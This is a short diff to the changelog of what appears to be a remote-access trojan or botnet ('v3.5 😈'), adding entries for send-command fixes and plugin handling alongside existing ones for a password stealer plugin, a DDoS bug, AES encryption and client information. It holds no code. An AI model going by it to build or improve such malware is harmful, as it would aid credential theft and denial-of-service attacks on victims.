@@ -105,8 +105,10 @@ v3.5 😈
  + Fixed Password Stealer Plugin
  + Fixed Check Update Bug
  + Fixed DDoS Bug
+ + Fixed [ Send Command ] Issues
  + Better Blacklisting
  + Better TEMP Cleaner
+ + Better Plugin Handling
  + Replace RSA with AES-128
  + Improved HTTP Socket
  + More Client Information
